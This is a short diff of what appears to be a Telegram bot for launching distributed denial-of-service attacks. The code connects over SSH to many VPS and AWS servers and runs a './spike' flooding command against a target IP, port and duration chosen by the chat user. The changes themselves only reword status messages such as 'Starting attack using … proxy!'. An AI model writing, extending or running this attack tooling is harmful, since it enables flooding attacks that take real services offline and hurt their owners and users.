@@ -451,7 +451,7 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     total_vps = len(vps_list) + len(aws_vps_list)
-    await context.bot.send_message(chat_id, f"🔥 *Starting attack using {total_vps}  instances!*", parse_mode="Markdown")
+    await context.bot.send_message(chat_id, f"🔥 *Starting attack using {total_vps}  proxy!*", parse_mode="Markdown")
 
     # Run attacks in parallel
     tasks = []
@@ -494,7 +494,7 @@ async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, 
                 command = f"./spike {target_ip} {port} {duration} 1024 1000"
 
             await conn.run(command, check=True)
-            await context.bot.send_message(chat_id, f"✅ *Attack executed on IP", parse_mode="Markdown")
+            await context.bot.send_message(chat_id, f"✅ *Attack executed on IP*", parse_mode="Markdown")
 
         except asyncssh.Error as e:
             await context.bot.send_message(chat_id, f"❌ *Error on {vps_data['ip']} ({attack_type}): {str(e)}*", parse_mode="Markdown")
